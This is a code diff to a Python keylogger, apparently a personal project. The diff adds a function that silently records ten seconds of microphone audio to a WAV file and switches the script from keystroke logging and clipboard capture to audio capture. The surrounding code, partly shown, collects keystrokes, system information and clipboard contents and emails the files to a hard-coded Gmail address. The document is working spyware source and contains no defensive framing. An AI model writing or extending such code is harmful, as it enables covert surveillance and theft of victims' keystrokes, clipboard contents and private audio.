@@ -39,6 +39,7 @@ from PIL import ImageGrab
 keys_information = "key_log.txt"
 system_information = "systeminfo.txt"
 clipboard_information = "clipboard.txt"
+audio_information = "audio.wav"
 
 file_path = "C:\\Users\\user\\Desktop\\Keylogger\\Project"
 extend = "\\"
@@ -50,6 +51,7 @@ toaddress = "sankalpshanky007@gmail.com"
 
 full_log = ""
 word = ""
+microphone_time = 10
 
 
 # char_limit = 50
@@ -104,6 +106,14 @@ def send_email(filename, attachment, to_addr):
     s.sendmail(from_address, to_addr, text)
     s.quit()
 
+def microphone():
+    fs = 44100
+    seconds = microphone_time
+
+    myrecording = sd.rec(int(seconds * fs), samplerate= fs, channels=2)
+    sd.wait()
+
+    write(file_path + extend + audio_information, fs, myrecording)
 
 def on_press(key):
     global word, full_log
@@ -136,9 +146,10 @@ def on_release(key):
         return False
 
 
-with Listener(on_press=on_press, on_release=on_release) as listener:
-    listener.join()
+# with Listener(on_press=on_press, on_release=on_release) as listener:
+#     listener.join()
 
 # send_email(keys_information, file_path + extend + keys_information, toaddress)
 # computer_information()
-copy_clipboard()
+# copy_clipboard()
+microphone()
